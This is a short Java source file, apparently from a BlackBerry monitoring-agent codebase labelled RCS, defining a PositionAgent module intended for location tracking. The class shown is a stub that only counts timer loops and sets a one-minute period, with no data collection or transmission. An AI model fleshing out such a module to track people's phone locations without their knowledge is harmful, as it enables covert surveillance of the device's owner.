//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : PositionAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import blackberry.Conf;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class PositionAgent.
 */
public final class PositionAgent extends Agent {
    //#ifdef DEBUG
    static Debug debug = new Debug("PositionAgent", DebugLevel.VERBOSE);
    //#endif

    int loop = 0;

    /**
     * Instantiates a new position agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public PositionAgent(final boolean agentStatus) {
        super(AGENT_POSITION, agentStatus, Conf.AGENT_POSITION_ON_SD, "PositionAgent");

    }

    /**
     * Instantiates a new position agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected PositionAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualRun() {
        //#ifdef DEBUG_TRACE
        //debug.trace("loop:" + loop);
        //#endif
        ++loop;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParameters) {
        setPeriod(60000);

        return false;
    }
}
